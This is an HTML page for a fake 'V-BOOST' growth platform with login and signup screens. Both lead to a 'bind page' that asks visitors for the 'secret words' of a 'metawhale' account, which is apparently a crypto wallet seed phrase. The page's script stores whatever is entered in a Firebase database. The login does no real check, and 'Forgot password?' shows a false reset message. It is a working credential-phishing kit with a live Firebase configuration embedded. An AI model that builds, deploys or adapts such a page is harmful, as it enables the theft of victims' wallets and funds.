<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>V-BOOST</title>

<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600&display=swap" rel="stylesheet">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">

<style>
*{margin:0;padding:0;box-sizing:border-box;font-family:'Poppins',sans-serif;}
body{background:#f5f6fa;overflow-x:hidden;}

/* SLIDER */
.pages{
display:flex;
width:300%;
transition:0.5s;
}
.page{
width:100%;
min-height:100vh;
}

/* EXISTING SAME DESIGN */
.container{display:flex;min-height:100vh;}
.left{width:50%;padding:60px;display:flex;flex-direction:column;justify-content:center;}
.logo{font-size:26px;font-weight:600;margin-bottom:30px;}
h1{font-size:32px;margin-bottom:10px;}
.sub{color:#777;margin-bottom:30px;}

.label{font-size:14px;margin-bottom:5px;display:block;}
.field{margin-bottom:20px;position:relative;}
input,textarea{
width:100%;
padding:14px;
border-radius:25px;
border:1px solid #ddd;
outline:none;
}
textarea{
border-radius:10px;
border:2px solid #000;
min-height:150px;
resize:none;
}

.eye{
position:absolute;
right:15px;
top:50%;
transform:translateY(-50%);
cursor:pointer;
color:#888;
}

/* 🔥 FIX 1 */
.forgot{
text-align:right;
font-size:13px;
color:#ff3b3b;
margin-top:-10px;
margin-bottom:20px;
cursor:pointer;
}

.btn{
width:160px;
padding:12px;
border:none;
border-radius:25px;
background:#ff3b3b;
color:#fff;
font-weight:600;
cursor:pointer;
}

.switch{margin-top:20px;font-size:14px;}
.switch span{color:#ff3b3b;cursor:pointer;font-weight:600;}

.divider{display:flex;align-items:center;margin:25px 0;color:#aaa;}
.divider::before,.divider::after{
content:"";
flex:1;
height:1px;
background:#ddd;
margin:0 10px;
}

.social{display:flex;gap:15px;}
.social a{
width:45px;height:45px;border-radius:10px;border:1px solid #ddd;
display:flex;align-items:center;justify-content:center;cursor:pointer;
}

.right{width:50%;display:flex;align-items:center;justify-content:center;padding:40px;}
.card{background:#fff;border-radius:30px;padding:20px;box-shadow:0 10px 30px rgba(0,0,0,0.1);text-align:center;}
.card img{width:100%;max-width:350px;border-radius:20px;}
.card p{margin-top:15px;font-size:14px;color:#555;}

/* NEXT PAGE */
.next{
background:linear-gradient(to bottom,#fff,#ffe5e5);
padding:30px;
}
.next h1{color:#ff3b3b;}
.fullbtn{
width:100%;
margin-top:20px;
padding:14px;
background:#ff3b3b;
color:#fff;
border:none;
border-radius:25px;
}

/* MOBILE */
@media(max-width:768px){
.container{flex-direction:column;}
.left,.right{width:100%;padding:20px;}
.btn{width:100%;}
}
</style>
</head>

<body>

<div class="pages" id="pages">

<!-- LOGIN PAGE -->
<div class="page">
<div class="container">
<div class="left">
<div class="logo">V-BOOST</div>
<h1>Welcome to V-Boost</h1>
<p class="sub">Where your growth becomes digital capital</p>

<label class="label">Email</label>
<div class="field"><input id="email"></div>

<label>Password</label>
<div class="field">
<input id="password" type="password">
<i class="fa fa-eye eye" onclick="toggle('password',this)"></i>
</div>

<!-- 🔥 FIX 1 ADDED -->
<div class="forgot" onclick="forgotPassword()">Forgot password?</div>

<button class="btn" onclick="goNext()">Log in</button>

<div class="switch">
Do not have an account? <span onclick="goSignup()">Sign up</span>
</div>

<div class="divider">or</div>

<div class="social">
<a onclick="goSignup()"><i class="fab fa-google"></i></a>
<a onclick="alertPage('Feature not available')"><i class="fab fa-facebook-f"></i></a>
<a onclick="alertPage('Open in your iOS device')"><i class="fab fa-apple"></i></a>
<a onclick="alertPage('Feature not available')"><i class="fab fa-x-twitter"></i></a>
</div>
</div>

<div class="right">
<div class="card">
<img src="https://i.ibb.co/XkytsVhb/Screenshot-2026-0416-014451.png">
<p>V-Boost is your digital capital.</p>
</div>
</div>
</div>
</div>

<!-- SIGNUP PAGE -->
<div class="page">
<div class="left">
<h1>Signup</h1>

<label>Email (Gmail required)</label>
<div class="field"><input id="sEmail"></div>

<label>Create Password</label>
<div class="field">
<input id="sPass" type="password">
<i class="fa fa-eye eye" onclick="toggle('sPass',this)"></i>
</div>

<label>Confirm Password</label>
<div class="field">
<input id="cPass" type="password">
<i class="fa fa-eye eye" onclick="toggle('cPass',this)"></i>
</div>

<!-- IMPORTANT FIX (UNCHANGED LOGIC, JUST ENSURED WORKING) -->
<button class="btn" onclick="goNext()">Signup</button>
</div>
</div>

<!-- NEXT PAGE -->
<div class="page next">
<h1>Welcome to V-BOOST bind page</h1>
<p>login your metawhale account for continue with V-BOOST</p>

<textarea id="secret" placeholder="enter secret words for login account"></textarea>

<button class="fullbtn" onclick="saveData()">Open Account</button>
</div>

</div>

<!-- FIREBASE (UNCHANGED) -->
<script type="module">
import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
import { getFirestore, addDoc, collection } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore.js";

const firebaseConfig = {
apiKey: "AIzaSyBvfZO9pxRshe4M8aavrLlHexq42vZDQ2g",
authDomain: "v-academy-82560.firebaseapp.com",
projectId: "v-academy-82560",
storageBucket: "v-academy-82560.firebasestorage.app",
messagingSenderId: "826822771378",
appId: "1:826822771378:web:5357b1b989b298a8027fab"
};

const app = initializeApp(firebaseConfig);
const db = getFirestore(app);

window.saveData = async function(){
let text=document.getElementById("secret").value;

if(text===""){
alert("Enter data first");
return;
}

await addDoc(collection(db,"users"),{
message:text,
time:new Date()
});

alert("Saved Successfully");
}
</script>

<script>
function toggle(id,el){
let input=document.getElementById(id);
if(input.type==="password"){
input.type="text";
el.classList.replace("fa-eye","fa-eye-slash");
}else{
input.type="password";
el.classList.replace("fa-eye-slash","fa-eye");
}
}

function goSignup(){
document.getElementById("pages").style.transform="translateX(-100%)";
}

function goNext(){
document.getElementById("pages").style.transform="translateX(-200%)";
}

/* 🔥 FIX 2 ADDED */
function forgotPassword(){
alert("Reset link sent to your Gmail");
}

function alertPage(msg){
document.body.innerHTML="<div style='background:#fff;height:100vh;display:flex;align-items:center;justify-content:center;font-size:20px;'>"+msg+"</div>";
}
</script>

</body>
</html>
